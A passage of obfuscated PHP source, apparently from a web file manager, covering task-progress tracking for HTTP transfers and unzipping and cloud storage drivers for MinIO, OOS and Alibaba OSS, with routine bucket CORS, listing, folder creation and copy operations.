$b¿öÑâÕ¢ò, $BĞ›Ï†‡) { $BëÇ–•Æ„× =& $_SERVER[‡’¶øåüç˜]; $bÎ‚”‡®â =& $this->task; $bÎ‚”‡®â[$BëÇ–•Æ„×[1489]] = $bÎ‚”‡®â[$BëÇ–•Æ„×[1488]]; $bÎ‚”‡®â[$BëÇ–•Æ„×[1490]] = $BëÇ–•Æ„×[33]; if ($b¿öÑâÕ¢ò == $bÎ‚”‡®â[$BëÇ–•Æ„×[1486]]) { $bÎ‚”‡®â[$BëÇ–•Æ„×[1492]] += $bÎ‚”‡®â[$BëÇ–•Æ„×[1488]]; $bÎ‚”‡®â[$BëÇ–•Æ„×[1493]] = $bÎ‚”‡®â[$BëÇ–•Æ„×[1492]]; $this->update(1); } else { $this->update(); $bÎ‚”‡®â[$BëÇ–•Æ„×[1489]] = 0; } self::log($BëÇ–•Æ„×[1501] . $A†ª„Î¬šÓ . $BëÇ–•Æ„×[66] . $EÎº‚ñ”‡î . $BëÇ–•Æ„×[221] . $b¿öÑâÕ¢ò . $BëÇ–•Æ„×[1502] . $bÎ‚”‡®â[$BëÇ–•Æ„×[1486]]); } public function updateFileEnd($b¬ï†ïŠÚô, $aİ¨¶ªÌ) { goto CÊ¶È¤‹öñ; CÃ¶„ˆóÊƒ: $eàÙ±µŒ¶[$E„‚éÎ¶«¾[1488]] = $aİ¨¶ªÌ; $eàÙ±µŒ¶[$E„‚éÎ¶«¾[1492]] += $aİ¨¶ªÌ; $eàÙ±µŒ¶[$E„‚éÎ¶«¾[1493]] = $eàÙ±µŒ¶[$E„‚éÎ¶«¾[1492]]; goto CË¦š—ğ††; CË¦š—ğ††: $this->update(1); self::log($E„‚éÎ¶«¾[1503] . $b¬ï†ïŠÚô); goto b‹ğù„; CÊ¶È¤‹öñ: $E„‚éÎ¶«¾ =& $_SERVER[‡’¶øåüç˜]; $eàÙ±µŒ¶ =& $this->task; $eàÙ±µŒ¶[$E„‚éÎ¶«¾[1486]] = $b¬ï†ïŠÚô; goto CÃ¶„ˆóÊƒ; b‹ğù„: } public function sourceModelCopy($A˜Ê¸ÈåÉ¡) { goto c¸øÓ‡É¶ä; c¸øÓ‡É¶ä: $FòáÒğÊï§ =& $_SERVER[‡’¶øåüç˜]; $a©âçõÕÎ° = $A˜Ê¸ÈåÉ¡[0]; $Fª¸ÒåğÓî = $A˜Ê¸ÈåÉ¡[1]; goto F¡ä¤Ê»Õİ; D­ ·£ïÅÀ: switch ($a©âçõÕÎ°) { case $FòáÒğÊï§[520]: $e×²ëÙ†Ç = 1; break; case $FòáÒğÊï§[523]: $CçªÆŒøç[$FòáÒğÊï§[1486]] = $Fª¸ÒåğÓî[$FòáÒğÊï§[28]]; break; case $FòáÒğÊï§[525]: $e×²ëÙ†Ç = intval($A˜Ê¸ÈåÉ¡[$FòáÒğÊï§[367]] * 0.4); break; case $FòáÒğÊï§[527]: $e×²ëÙ†Ç = intval($A˜Ê¸ÈåÉ¡[$FòáÒğÊï§[367]] * 0.2); break; case $FòáÒğÊï§[529]: $e×²ëÙ†Ç = intval($A˜Ê¸ÈåÉ¡[$FòáÒğÊï§[367]] * 0.4); break; } $this->update($e×²ëÙ†Ç); $this->sourceModelCopyFlag = !1; goto Bòëøƒ–´Ş; F¡ä¤Ê»Õİ: $CçªÆŒøç =& $this->task; $this->sourceModelCopyFlag = !0; $e×²ëÙ†Ç = 0; goto D­ ·£ïÅÀ; Bòëøƒ–´Ş: } public function sourceRemove($A¿‰°¶–á‘, $f”¬‹‹†òÅ) { $B‚´òÅÆÅÙ =& $_SERVER[‡’¶øåüç˜]; $this->sourceModelCopyFlag = !0; $Bê„±Şîîè = 1; if (isset($A¿‰°¶–á‘[$B‚´òÅÆÅÙ[80]])) { $Bê„±Şîîè = $A¿‰°¶–á‘[$B‚´òÅÆÅÙ[80]][$B‚´òÅÆÅÙ[78]] + $A¿‰°¶–á‘[$B‚´òÅÆÅÙ[80]][$B‚´òÅÆÅÙ[79]] + 1; } $this->update($Bê„±Şîîè); $this->sourceModelCopyFlag = !1; } public function sourceMove($b¥×µÛŠ£¸) { $this->sourceRemove($b¥×µÛŠ£¸, !1); } public function curlProgress($A“Ïß’ØÉ, $e»‹±“ÁË®, $c™†ÅË¨ôº, $FÎ·áÑñ´–, $f‰à õÖ‹‹) { $fÈ«º¥ƒĞÕ =& $_SERVER[‡’¶øåüç˜]; $BÁàöò“„µ =& $this->task; if ($f‰à õÖ‹‹ > 0) { $BÁàöò“„µ[$fÈ«º¥ƒĞÕ[982]] = $fÈ«º¥ƒĞÕ[1504]; $BÁàöò“„µ[$fÈ«º¥ƒĞÕ[1490]] = $fÈ«º¥ƒĞÕ[103]; if ($BÁàöò“„µ[$fÈ«º¥ƒĞÕ[1488]] == $FÎ·áÑñ´– || $FÎ·áÑñ´– > 1024 * 1024) { $BÁàöò“„µ[$fÈ«º¥ƒĞÕ[1489]] = $f‰à õÖ‹‹; } if ($BÁàöò“„µ[$fÈ«º¥ƒĞÕ[1491]]) { $BÁàöò“„µ[$fÈ«º¥ƒĞÕ[1489]] = $f‰à õÖ‹‹ + $BÁàöò“„µ[$fÈ«º¥ƒĞÕ[1491]]; } } else { if ($c™†ÅË¨ôº > 0) { if ($BÁàöò“„µ[$fÈ«º¥ƒĞÕ[1488]] == $e»‹±“ÁË®) { $BÁàöò“„µ[$fÈ«º¥ƒĞÕ[1489]] = $c™†ÅË¨ôº; $BÁàöò“„µ[$fÈ«º¥ƒĞÕ[982]] = $fÈ«º¥ƒĞÕ[1505]; $BÁàöò“„µ[$fÈ«º¥ƒĞÕ[1490]] = $fÈ«º¥ƒĞÕ[1048]; } } } $this->update(); } public function curlProgressStart($dÅé»ŠäÃ) { } public function curlProgressEnd($D‰Š¿×Ğ÷) { $fšœ³†ˆÉ¬ =& $_SERVER[‡’¶øåüç˜]; $fÂŸÎÀå†® =& $this->task; $AÜÔÁæ› § = curl_getinfo($D‰Š¿×Ğ÷); $F§ÏÚùÚË = $AÜÔÁæ› §[$fšœ³†ˆÉ¬[1506]]; if ($fÂŸÎÀå†®[$fšœ³†ˆÉ¬[1490]] == $fšœ³†ˆÉ¬[103] && $F§ÏÚùÚË) { $fÂŸÎÀå†®[$fšœ³†ˆÉ¬[1491]] += $F§ÏÚùÚË; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $cÓÄÂ£Æ¿ù =& $_SERVER[‡’¶øåüç˜]; $dğÁ°Ï·«ñ =& $this->task; $dğÁ°Ï·«ñ[$cÓÄÂ£Æ¿ù[1507]] = 1; Hook::bind($cÓÄÂ£Æ¿ù[1480], array($this, $cÓÄÂ£Æ¿ù[1508])); Hook::bind($cÓÄÂ£Æ¿ù[1482], array($this, $cÓÄÂ£Æ¿ù[1509])); Hook::bind($cÓÄÂ£Æ¿ù[1484], array($this, $cÓÄÂ£Æ¿ù[1510])); } protected function endAfter() { $e·İ¼’äà =& $_SERVER[‡’¶øåüç˜]; Hook::unbind($e·İ¼’äà[1480], array($this, $e·İ¼’äà[1508])); Hook::unbind($e·İ¼’äà[1482], array($this, $e·İ¼’äà[1509])); Hook::unbind($e·İ¼’äà[1484], array($this, $e·İ¼’äà[1510])); } public function progressStart($F„”ª’ğå’) { $C–Ş‹ôÔ² =& $_SERVER[‡’¶øåüç˜]; $EËÚè‹›é = curl_getinfo($F„”ª’ğå’); self::log($C–Ş‹ôÔ²[1511] . $EËÚè‹›é[$C–Ş‹ôÔ²[299]]); self::valueSet($this->task[$C–Ş‹ôÔ²[371]], $this->task); } public function progressEnd($cœÇ’é›…) { $Eƒ¤ÏŞçˆ· =& $_SERVER[‡’¶øåüç˜]; self::log($Eƒ¤ÏŞçˆ·[1512] . $this->task[$Eƒ¤ÏŞçˆ·[371]]); $this->end(); } public function progress($DˆšêË¤Ó, $CÊåë‘ç‰, $FµÔ¸¤ˆ±ˆ, $BË‘²Û¼ï, $eĞ·¾ÆÚ‚¹) { $AßŸšˆ³¾¨ =& $_SERVER[‡’¶øåüç˜]; $eµÆä³³Â— =& $this->task; if ($eĞ·¾ÆÚ‚¹ > 0) { $eµÆä³³Â—[$AßŸšˆ³¾¨[980]] = $eµÆä³³Â—[$AßŸšˆ³¾¨[980]] == 0 ? $BË‘²Û¼ï : $eµÆä³³Â—[$AßŸšˆ³¾¨[980]]; $eµÆä³³Â—[$AßŸšˆ³¾¨[994]] = $eĞ·¾ÆÚ‚¹; } else { if ($FµÔ¸¤ˆ±ˆ > 0) { $eµÆä³³Â—[$AßŸšˆ³¾¨[980]] = $eµÆä³³Â—[$AßŸšˆ³¾¨[980]] == 0 ? $CÊåë‘ç‰ : $eµÆä³³Â—[$AßŸšˆ³¾¨[980]]; $eµÆä³³Â—[$AßŸšˆ³¾¨[994]] = $FµÔ¸¤ˆ±ˆ; } } $this->update(); self::log("\x70\162\157\147\162\x65\163\x73\110\x74\164\160\72\x64\157\167\x6e\x3a{$FµÔ¸¤ˆ±ˆ}\x2f{$CÊåë‘ç‰}\73\40\165\160\x6c\x6f\x61\144\72{$eĞ·¾ÆÚ‚¹}\x2f{$BË‘²Û¼ï}\73"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto f÷¯°Ì²¿; f÷¯°Ì²¿: $Cóí«Ç¶“Š =& $_SERVER[‡’¶øåüç˜]; parent::startAfter(); Hook::bind($Cóí«Ç¶“Š[1513], array($this, $Cóí«Ç¶“Š[1514])); goto bŞÙ³‚ù…; bŞÙ³‚ù…: Hook::bind($Cóí«Ç¶“Š[1043], array($this, $Cóí«Ç¶“Š[1515])); $EŸèÒÎ­ºö =& $this->task; $EŸèÒÎ­ºö[$Cóí«Ç¶“Š[1516]] = $Cóí«Ç¶“Š[1048]; goto dÇÚÃ•¿õ; dÇÚÃ•¿õ: if (!$EŸèÒÎ­ºö[$Cóí«Ç¶“Š[1348]]) { $EŸèÒÎ­ºö[$Cóí«Ç¶“Š[1348]] = LNG($Cóí«Ç¶“Š[1517]); } goto FôîŒÀ¶Î; FôîŒÀ¶Î: } protected function endAfter() { $f¿ÏĞèÎÂº =& $_SERVER[‡’¶øåüç˜]; parent::endAfter(); Hook::unbind($f¿ÏĞèÎÂº[1513], array($this, $f¿ÏĞèÎÂº[1514])); Hook::unbind($f¿ÏĞèÎÂº[1043], array($this, $f¿ÏĞèÎÂº[1515])); } public function updateAfter() { $dæÃÆƒ©ÊÇ =& $_SERVER[‡’¶øåüç˜]; $d°ˆÛõ¿öÜ =& $this->task; if (!$d°ˆÛõ¿öÜ[$dæÃÆƒ©ÊÇ[980]] || !$d°ˆÛõ¿öÜ[$dæÃÆƒ©ÊÇ[704]]) { return; } if ($d°ˆÛõ¿öÜ[$dæÃÆƒ©ÊÇ[1516]] == $dæÃÆƒ©ÊÇ[1048]) { $C‡©Ú¥­ç¥ = 0; if ($d°ˆÛõ¿öÜ[$dæÃÆƒ©ÊÇ[1488]]) { $C‡©Ú¥­ç¥ = $d°ˆÛõ¿öÜ[$dæÃÆƒ©ÊÇ[1489]] / $d°ˆÛõ¿öÜ[$dæÃÆƒ©ÊÇ[1488]]; } $d°ˆÛõ¿öÜ[$dæÃÆƒ©ÊÇ[1444]] = $C‡©Ú¥­ç¥ * 0.3; } else { if ($d°ˆÛõ¿öÜ[$dæÃÆƒ©ÊÇ[1516]] == $dæÃÆƒ©ÊÇ[305]) { $C‡©Ú¥­ç¥ = $d°ˆÛõ¿öÜ[$dæÃÆƒ©ÊÇ[994]] / $d°ˆÛõ¿öÜ[$dæÃÆƒ©ÊÇ[980]]; $d°ˆÛõ¿öÜ[$dæÃÆƒ©ÊÇ[1444]] = 0.3 + $C‡©Ú¥­ç¥ * 0.4; } else { if ($d°ˆÛõ¿öÜ[$dæÃÆƒ©ÊÇ[1516]] == $dæÃÆƒ©ÊÇ[103]) { $bí½ğ˜¯‘œ = 0; if ($d°ˆÛõ¿öÜ[$dæÃÆƒ©ÊÇ[1490]] == $dæÃÆƒ©ÊÇ[103]) { $bí½ğ˜¯‘œ = $d°ˆÛõ¿öÜ[$dæÃÆƒ©ÊÇ[1489]]; } $C‡©Ú¥­ç¥ = ($d°ˆÛõ¿öÜ[$dæÃÆƒ©ÊÇ[1493]] + $bí½ğ˜¯‘œ) / $d°ˆÛõ¿öÜ[$dæÃÆƒ©ÊÇ[704]]; $d°ˆÛõ¿öÜ[$dæÃÆƒ©ÊÇ[1444]] = 0.3 + 0.4 + $C‡©Ú¥­ç¥ * 0.3; } } } if ($d°ˆÛõ¿öÜ[$dæÃÆƒ©ÊÇ[1444]] > 0) { $aÉÏÒ…‰Ûª = timeFloat() - $d°ˆÛõ¿öÜ[$dæÃÆƒ©ÊÇ[1446]] - $d°ˆÛõ¿öÜ[$dæÃÆƒ©ÊÇ[1449]]; $d°ˆÛõ¿öÜ[$dæÃÆƒ©ÊÇ[1450]] = $aÉÏÒ…‰Ûª * (1 - $d°ˆÛõ¿öÜ[$dæÃÆƒ©ÊÇ[1444]]) / $d°ˆÛõ¿öÜ[$dæÃÆƒ©ÊÇ[1444]]; } } public function addFile($EÑºìŞğ“ë) { goto bÓ„Òµö›Ë; e›‹ÇÙ¿Ùæ: $this->update(); goto B¨ÅÒã¨Ô; b½˜ÒÈ·Åë: $F¥±ãé±îÇ[$dŞ·öÁ‹¤Ê[982]] = $dŞ·öÁ‹¤Ê[1505]; $F¥±ãé±îÇ[$dŞ·öÁ‹¤Ê[1490]] = $dŞ·öÁ‹¤Ê[1048]; $F¥±ãé±îÇ[$dŞ·öÁ‹¤Ê[704]] = $aÁçÅƒ©å[$dŞ·öÁ‹¤Ê[77]]; goto aäŒŒ“…; B…ªò„‘Ô‡: $F¥±ãé±îÇ[$dŞ·öÁ‹¤Ê[1486]] = $aÁçÅƒ©å[$dŞ·öÁ‹¤Ê[28]]; $F¥±ãé±îÇ[$dŞ·öÁ‹¤Ê[1488]] = $aÁçÅƒ©å[$dŞ·öÁ‹¤Ê[77]]; $F¥±ãé±îÇ[$dŞ·öÁ‹¤Ê[1489]] = 0; goto b½˜ÒÈ·Åë; aäŒŒ“…: $F¥±ãé±îÇ[$dŞ·öÁ‹¤Ê[980]] = 1; $F…ôùŸÄÁ‰ = 0; $F¥±ãé±îÇ[$dŞ·öÁ‹¤Ê[1497]] = array($dŞ·öÁ‹¤Ê[1498] => $F…ôùŸÄÁ‰ + 1, $dŞ·öÁ‹¤Ê[398] => $aÁçÅƒ©å[$dŞ·öÁ‹¤Ê[28]], $dŞ·öÁ‹¤Ê[75] => $aÁçÅƒ©å[$dŞ·öÁ‹¤Ê[75]], $dŞ·öÁ‹¤Ê[479] => $aÁçÅƒ©å[$dŞ·öÁ‹¤Ê[479]] ? $aÁçÅƒ©å[$dŞ·öÁ‹¤Ê[479]] : $aÁçÅƒ©å[$dŞ·öÁ‹¤Ê[75]]); goto e›‹ÇÙ¿Ùæ; bÓ„Òµö›Ë: $dŞ·öÁ‹¤Ê =& $_SERVER[‡’¶øåüç˜]; $F¥±ãé±îÇ =& $this->task; $aÁçÅƒ©å = IO::info($EÑºìŞğ“ë); goto B…ªò„‘Ô‡; B¨ÅÒã¨Ô: } public function unzipAfter($d™Œ”´ßÖ) { goto dÅÓ½š˜¹à; E›ò™£¥’: $F ÷“‘«[$aÄôïîÆˆ[994]] = 0; $F ÷“‘«[$aÄôïîÆˆ[1488]] = 0; $F ÷“‘«[$aÄôïîÆˆ[1489]] = 0; goto A³§ù’Œñ; A³§ù’Œñ: $F ÷“‘«[$aÄôïîÆˆ[1486]] = $aÄôïîÆˆ[33]; $F ÷“‘«[$aÄôïîÆˆ[1493]] = 0; $F ÷“‘«[$aÄôïîÆˆ[704]] = $f‰•«Ñ¹»Š[$aÄôïîÆˆ[77]]; goto c¹¬ä‰ÔõŸ; c¹¬ä‰ÔõŸ: $this->update(); self::log($aÄôïîÆˆ[1518] . json_encode(array($F ÷“‘«, $f‰•«Ñ¹»Š))); goto cÜ›‘Û®¾; a˜‰ìá·•ˆ: $f‰•«Ñ¹»Š = IO::infoWithChildren($d™Œ”´ßÖ); $C“ùğÖˆ«‘ = 0; $F ÷“‘«[$aÄôïîÆˆ[1497]] = array($aÄôïîÆˆ[1498] => $C“ùğÖˆ«‘ + 1, $aÄôïîÆˆ[398] => $f‰•«Ñ¹»Š[$aÄôïîÆˆ[28]], $aÄôïîÆˆ[75] => $f‰•«Ñ¹»Š[$aÄôïîÆˆ[75]], $aÄôïîÆˆ[479] => $f‰•«Ñ¹»Š[$aÄôïîÆˆ[479]] ? $f‰•«Ñ¹»Š[$aÄôïîÆˆ[479]] : $f‰•«Ñ¹»Š[$aÄôïîÆˆ[75]]); goto C¤Ìì£ŒĞ; C¤Ìì£ŒĞ: if ($f‰•«Ñ¹»Š[$aÄôïîÆˆ[29]] == $aÄôïîÆˆ[171]) { $F ÷“‘«[$aÄôïîÆˆ[980]] = 1; } else { $F ÷“‘«[$aÄôïîÆˆ[980]] = $f‰•«Ñ¹»Š[$aÄôïîÆˆ[80]][$aÄôïîÆˆ[78]]; } $F ÷“‘«[$aÄôïîÆˆ[982]] = $aÄôïîÆˆ[33]; $F ÷“‘«[$aÄôïîÆˆ[1490]] = 0; goto E›ò™£¥’; dÅÓ½š˜¹à: $aÄôïîÆˆ =& $_SERVER[‡’¶øåüç˜]; $F ÷“‘« =& $this->task; $F ÷“‘«[$aÄôïîÆˆ[1516]] = $aÄôïîÆˆ[103]; goto a˜‰ìá·•ˆ; cÜ›‘Û®¾: } public function nameParse($fÈ×öØ±ä) { goto Bã‡¯Øáß§; bŒ´°ß¬ìã: $cİŒÄÏº™À = get_path_this($fÈ×öØ±ä); if (strstr($cİŒÄÏº™À, $b¢¿‰”¨ÃÎ[91])) { $BÆºä¦âµ¤[$b¢¿‰”¨ÃÎ[994]] += 1; $BÆºä¦âµ¤[$b¢¿‰”¨ÃÎ[980]] += 1; } $BÆºä¦âµ¤[$b¢¿‰”¨ÃÎ[1486]] = $fÈ×öØ±ä; goto F ÅØµ×ˆ–; F ÅØµ×ˆ–: $this->update(); goto e·¼ÎòèÕ; Bã‡¯Øáß§: $b¢¿‰”¨ÃÎ =& $_SERVER[‡’¶øåüç˜]; $BÆºä¦âµ¤ =& $this->task; if ($BÆºä¦âµ¤[$b¢¿‰”¨ÃÎ[1516]] == $b¢¿‰”¨ÃÎ[1048]) { $BÆºä¦âµ¤[$b¢¿‰”¨ÃÎ[1516]] = $b¢¿‰”¨ÃÎ[305]; $BÆºä¦âµ¤[$b¢¿‰”¨ÃÎ[1493]] = 0; $BÆºä¦âµ¤[$b¢¿‰”¨ÃÎ[704]] = 0; } goto bŒ´°ß¬ìã; e·¼ÎòèÕ: } } goto FêÔµ—’¦‡; Dƒ³÷³¹‚: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Cã¯´ì˜æ¸) { parent::__construct($Cã¯´ì˜æ¸); $this->signatureVersion($_SERVER[‡’¶øåüç˜][204]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($CÎåæ¼š¬ƒ) { parent::__construct($CÎåæ¼š¬ƒ); $this->signatureVersion($_SERVER[‡’¶øåüç˜][204]); } public function fileOutLink($aåìùˆéÜø) { $bÄ¶”àîôÂ =& $_SERVER[‡’¶øåüç˜]; if (substr($aåìùˆéÜø, 0, 7) == $bÄ¶”àîôÂ[1122]) { $aåìùˆéÜø = $bÄ¶”àîôÂ[1123] . substr($aåìùˆéÜø, 7); } header($bÄ¶”àîôÂ[156] . $aåìùˆéÜø); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($Aˆ½…ä’àä) { parent::__construct(); include_once SDK_DIR . $_SERVER[‡’¶øåüç˜][1177]; $this->_init($Aˆ½…ä’àä); } public function _init($aââßÁ‹Ô) { $aªìÇİš˜™ =& $_SERVER[‡’¶øåüç˜]; foreach ($aââßÁ‹Ô as $a¬ãóÂ„ªØ => $E±È¾öèù¶) { if (isset($this->{$a¬ãóÂ„ªØ})) { $this->{$a¬ãóÂ„ªØ} = $E±È¾öèù¶; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($aªìÇİš˜™[1178] . LNG($aªìÇİš˜™[1179])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto eßáÕ–‡ä; FÖÄÌíª¨: $cÁªŠËÙÈÇ->addRule($fÑ°ƒœ©Ï©); try { $this->client->putBucketCors($this->bucket, $cÁªŠËÙÈÇ); } catch (OSS\Core\OssException $EùòŠŞ»é‹) { return !1; } return !0; goto AÍó§ŸÊ‘ø; eßáÕ–‡ä: $FåëÕ³èµ =& $_SERVER[‡’¶øåüç˜]; $cÁªŠËÙÈÇ = new OSS\Model\CorsConfig(); $fÑ°ƒœ©Ï© = new OSS\Model\CorsRule(); goto bÄ­İŞ…; bÄ­İŞ…: $fÑ°ƒœ©Ï©->addAllowedOrigin($FåëÕ³èµ[1180]); $fÑ°ƒœ©Ï©->addAllowedMethod($FåëÕ³èµ[1181]); $fÑ°ƒœ©Ï©->addAllowedMethod($FåëÕ³èµ[1182]); goto fÜ„Éèàˆ; aƒ‚øàí: $fÑ°ƒœ©Ï©->setMaxAgeSeconds(600); $fÑ°ƒœ©Ï©->addExposeHeader($FåëÕ³èµ[1185]); $fÑ°ƒœ©Ï©->addAllowedHeader($FåëÕ³èµ[1180]); goto FÖÄÌíª¨; fÜ„Éèàˆ: $fÑ°ƒœ©Ï©->addAllowedMethod($FåëÕ³èµ[1183]); $fÑ°ƒœ©Ï©->addAllowedMethod($FåëÕ³èµ[1184]); $fÑ°ƒœ©Ï©->addAllowedMethod($FåëÕ³èµ[155]); goto aƒ‚øàí; AÍó§ŸÊ‘ø: } public function getBucketCors() { goto d¥¬¦İ´³Ô; d¥¬¦İ´³Ô: $fø•—•‘³¨ =& $_SERVER[‡’¶øåüç˜]; $Bˆ¼ÒÜ¨Ù» = null; try { $Bˆ¼ÒÜ¨Ù» = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $B×Ö¬øÏâ¶) { return null; } goto D×Œ—é¯êè; f´Á²ˆ§: return array($fø•—•‘³¨[179] => isset($A«Äº£™¡‘[0]) ? $A«Äº£™¡‘[0] : $fø•—•‘³¨[33], $fø•—•‘³¨[183] => $eµ«ÈÙôÙ, $fø•—•‘³¨[1186] => $Däâ÷‹±, $fø•—•‘³¨[1187] => isset($A““”‘Éœô[0]) ? $A““”‘Éœô[0] : $fø•—•‘³¨[33], $fø•—•‘³¨[181] => isset($EÆÕª²ĞÜ[0]) ? $EÆÕª²ĞÜ[0] : $fø•—•‘³¨[33]); goto DÇ’œ¡è°¿; D×Œ—é¯êè: if (!$Bˆ¼ÒÜ¨Ù» || !($eóÙ¨é = $Bˆ¼ÒÜ¨Ù»->getRules())) { return null; } $A«Äº£™¡‘ = $eóÙ¨é[0]->getAllowedOrigins(); $eµ«ÈÙôÙ = $eóÙ¨é[0]->getAllowedMethods(); goto b„½ñåÛ‡; b„½ñåÛ‡: $Däâ÷‹± = $eóÙ¨é[0]->getMaxAgeSeconds(); $A““”‘Éœô = $eóÙ¨é[0]->getExposeHeaders(); $EÆÕª²ĞÜ = $eóÙ¨é[0]->getAllowedHeaders(); goto f´Á²ˆ§; DÇ’œ¡è°¿: } public function isBucketCors() { goto c»àªáŒî; E§Í×ÈÎœ”: if ($dßâ¨«ñÖó[$CÅÍÀ…áØ¸[179]] != $CÅÍÀ…áØ¸[180] || $dßâ¨«ñÖó[$CÅÍÀ…áØ¸[181]] != $CÅÍÀ…áØ¸[180]) { return !1; } $BÔßŒ§Õ = array_map($CÅÍÀ…áØ¸[182], $dßâ¨«ñÖó[$CÅÍÀ…áØ¸[183]]); if (!is_array($BÔßŒ§Õ)) { $BÔßŒ§Õ = array(); } goto f¡Êˆ»Îã; f¡Êˆ»Îã: $E ‡ë±­µÖ = array($CÅÍÀ…áØ¸[184], $CÅÍÀ…áØ¸[185], $CÅÍÀ…áØ¸[186], $CÅÍÀ…áØ¸[187], $CÅÍÀ…áØ¸[188]); $A…õÙÇœ×ƒ = array_diff($E ‡ë±­µÖ, $BÔßŒ§Õ); return empty($A…õÙÇœ×ƒ); goto bÃÜƒ¦ˆ„‹; c»àªáŒî: $CÅÍÀ…áØ¸ =& $_SERVER[‡’¶øåüç˜]; $dßâ¨«ñÖó = $this->getBucketCors(); if (!$dßâ¨«ñÖó || !is_array($dßâ¨«ñÖó)) { return !1; } goto E§Í×ÈÎœ”; bÃÜƒ¦ˆ„‹: } public function mkfile($eùÔÃŸŠçô, $Fˆ¿ñï… = '', $bËÆÑ‘å•¿ = REPEAT_RENAME) { $bÌğô©Ç£ˆ = $this->setContent($eùÔÃŸŠçô, $Fˆ¿ñï…); if ($bÌğô©Ç£ˆ !== !1) { return $this->getPathOuter($eùÔÃŸŠçô); } return !1; } public function mkdir($aÂ¿Îï¨õ´, $aø—‹ŒëÎê = REPEAT_SKIP) { if ($this->_isFolder($aÂ¿Îï¨õ´)) { return $this->getPathOuter($aÂ¿Îï¨õ´); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($aÂ¿Îï¨õ´)); } catch (OSS\Core\OssException $CÊ˜¡ôßğÜ) { return !1; } return $this->getPathOuter($aÂ¿Îï¨õ´); } private function fileList($A¾ñá´ , $c‰®ËŒˆ‡­ = '', $fÖ×ƒŞŸ¼† = 0) { goto Aõµ§Ó¨Éç; Aõµ§Ó¨Éç: $A«ß’Í¯Ö =& $_SERVER[‡’¶øåüç˜]; $A¾ñá´  = trim($A¾ñá´ , $A«ß’Í¯Ö[8]); $Dù‹ğ°µêõ = empty($A¾ñá´ ) ? $A«ß’Í¯Ö[33] : $A¾ñá´  . $A«ß’Í¯Ö[8]; goto BÂïÓŞÃ‰ğ; aâƒ¹¿øŠñ: while (!0) { $Fš¥ëà¹šÏ = array($A«ß’Í¯Ö[1188] => $c‰®ËŒˆ‡­, $A«ß’Í¯Ö[190] => $Dù‹ğ°µêõ, $A«ß’Í¯Ö[1189] => $eØ°¡ë†•â, $A«ß’Í¯Ö[1190] => $fä„‚«‰¹´); try { $dŞÎ†æÄ­µ = $this->client->listObjects($this->bucket, $Fš¥ëà¹šÏ); } catch (OSS\Core\OssException $Eğ¬æ§“Ä) { break; } $fä„‚«‰¹´ = $dŞÎ†æÄ­µ->getNextMarker(); $D®šÊÛŠ® = $dŞÎ†æÄ­µ->getObjectList(); $Eëğ½ğğ…» = $dŞÎ†æÄ­µ->getPrefixList(); foreach ($D®šÊÛŠ® as $C‹»‰î¦…ç) { if ($C‹»‰î¦…ç->getKey() == $Dù‹ğ°µêõ) { continue; } $D‡éé­´ñ£ = $C‹»‰î¦…ç->getKey(); if ($fÖ×ƒŞŸ¼†) { $D‡éé­´ñ£ = array($A«ß’Í¯Ö[28] => $D‡éé­´ñ£, $A«ß’Í¯Ö[77] => $C‹»‰î¦…ç->getSize(), $A«ß’Í¯Ö[194] => strtotime($C‹»‰î¦…ç->getLastModified())); } $CÇÁóì­¿[] = $D‡éé­´ñ£; } foreach ($Eëğ½ğğ…» as $e®ë¿ëŞÇ) { $fÏ‘Á§¥Û‰[] = $e®ë¿ëŞÇ->getPrefix(); } if ($fä„‚«‰¹´ === $A«ß’Í¯Ö[33]) { break; } } return array($A«ß’Í¯Ö[74] => $fÏ‘Á§¥Û‰, $A«ß’Í¯Ö[73] => $CÇÁóì­¿); goto eî¢Í”°ƒ; BÂïÓŞÃ‰ğ: $fä„‚«‰¹´ = $A«ß’Í¯Ö[33]; $eØ°¡ë†•â = 1000; $fÏ‘Á§¥Û‰ = $CÇÁóì­¿ = array(); goto aâƒ¹¿øŠñ; eî¢Í”°ƒ: } public function copyFile($CùÜšàµÃ, $A…–¤Ëø½¼) { $cœæ•ï“Ñ› = $this->size($CùÜšàµÃ); if ($cœæ•ï“Ñ› < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $CùÜšàµÃ, $this->bucket, $this->pathEncode($A…–¤Ëø½¼)); } catch (OSS\Core\OssException $Fƒ„˜­º·¨) { return !1; } return $this->getPathOuter($A…–¤Ëø½¼); } $fªˆí¶‚à = $this->multiCopyObject($CùÜšàµÃ, $A…–¤Ëø½¼, $cœæ•ï“Ñ›); return $fªˆí¶‚à ? $this->getPathOuter($A…–¤Ëø½¼) : !1; } private function multiCopyObject($E¡–îÖÉÛ­, $Cœ¨êÀ‰âå, $EŸ‹¦Îä¢ƒ) { $AÊÁ£–Ñå± =& $_SERVER[‡’¶øåüç˜]; try { goto EáğÍºìøº; FÊÛ‹§Õˆ½: $D°Õ«¤‡õÌ = 1; $AĞç»ëÙŒ› = 0; $fÈë¬ºÏ•Ø = array(); goto föŞ¼¼ÀÑ; Dà‹°×ÖÙ: $aÉ®òŒÏÀ‘ = array(); foreach ($fÈë¬ºÏ•Ø as $dùŠ·ÌÜÙá => $E“‚ÏÌäÍ) { $aÉ®òŒÏÀ‘[] = array($AÊÁ£–Ñå±[1195] => $dùŠ·ÌÜÙá + 1, $AÊÁ£–Ñå±[1196] => $E“‚ÏÌäÍ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Cœ¨êÀ‰âå), $B’é¢ö½µÚ, $aÉ®òŒÏÀ‘); goto C£òÊŸ‰Å; EáğÍºìøº: $b”±æô¨‹í = array(); if ($fŞËÅ·®Ó = $this->hashMd5($E¡–îÖÉÛ­)) { $b”±æô¨‹í = 